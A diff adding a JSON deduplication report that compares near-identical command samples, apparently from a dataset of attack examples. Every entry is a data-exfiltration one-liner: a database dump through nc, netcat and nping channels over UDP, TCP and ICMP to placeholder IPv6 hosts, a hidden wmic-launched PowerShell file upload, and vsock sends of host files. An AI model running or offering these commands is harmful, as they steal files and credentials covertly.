@@ -1,0 +1,51 @@
+{
+  "0": {
+    "Duplicated": 1,
+    "ComparedTo": 1,
+    "RemovedSentence": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+    "ComparedSentence": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+    "SimilarityScore": 1.0
+  },
+  "60": {
+    "Duplicated": 1,
+    "ComparedTo": 61,
+    "RemovedSentence": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
+    "ComparedSentence": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
+    "SimilarityScore": 0.9439243674278259
+  },
+  "61": {
+    "Duplicated": 1,
+    "ComparedTo": 67,
+    "RemovedSentence": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
+    "ComparedSentence": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 --ssl 2001:db8:dead:beef::21 60443 --send-only",
+    "SimilarityScore": 0.9161773920059204
+  },
+  "63": {
+    "Duplicated": 1,
+    "ComparedTo": 64,
+    "RemovedSentence": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --tcp --flags psh,ack --dest-port 59055 --data-string $b -c 1 2001:db8:dead:beef::25",
+    "ComparedSentence": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --udp --dest-port 56123 --data-string $b -c 3 --rate 1 2001:db8:dead:beef::22",
+    "SimilarityScore": 0.919357419013977
+  },
+  "65": {
+    "Duplicated": 1,
+    "ComparedTo": 68,
+    "RemovedSentence": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
+    "ComparedSentence": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe --icmp -6 2001:db8:dead:beef::10 --data-string $b -c 1",
+    "SimilarityScore": 0.9114567637443542
+  },
+  "83": {
+    "Duplicated": 1,
+    "ComparedTo": 87,
+    "RemovedSentence": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*ISATAP*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:1::30'); `$c.Connect(`$rv6,58222); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\media.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+    "ComparedSentence": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*6to4*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:2::44'); `$c.Connect(`$rv6,60023); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\thumbcache.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+    "SimilarityScore": 0.9135832190513611
+  },
+  "117": {
+    "Duplicated": 1,
+    "ComparedTo": 119,
+    "RemovedSentence": "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\"",
+    "ComparedSentence": "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 60917)); s.sendall(open('/etc/hosts','rb').read()); s.close()\"",
+    "SimilarityScore": 0.9137766361236572
+  }
+}
